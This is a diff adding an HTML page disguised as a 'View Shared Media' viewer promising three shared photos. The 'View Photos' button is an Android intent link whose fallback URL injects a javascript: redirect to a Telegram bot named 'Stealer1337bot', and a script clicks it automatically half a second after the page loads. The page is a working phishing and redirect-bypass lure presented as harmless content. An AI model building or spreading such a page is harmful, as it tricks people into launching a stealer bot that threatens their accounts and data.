@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Shared Media</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: -apple-system, system-ui, sans-serif; background: #f0f0f0; padding: 20px; }
+    .card {
+      max-width: 400px; margin: 60px auto; background: #fff;
+      border-radius: 16px; padding: 30px; text-align: center;
+      box-shadow: 0 2px 12px rgba(0,0,0,.08);
+    }
+    .card h2 { font-size: 22px; margin-bottom: 8px; }
+    .card p { color: #666; margin-bottom: 24px; }
+    .btn {
+      display: block; background: #2AABEE; color: #fff; text-decoration: none;
+      padding: 14px; border-radius: 10px; font-size: 16px; font-weight: 600;
+    }
+  </style>
+</head>
+<body>
+<div class="card">
+  <h2>View Shared Media</h2>
+  <p>3 photos shared with you</p>
+  <a id="trigger" class="btn" href="intent://x#Intent;scheme=nonexistent99;S.browser_fallback_url=javascript:void(location.href='tg://resolve?domain=Stealer1337bot&startapp=x');end">View Photos</a>
+</div>
+<script>setTimeout(function(){document.getElementById('trigger').click()},500)</script>
+</body>
+</html>
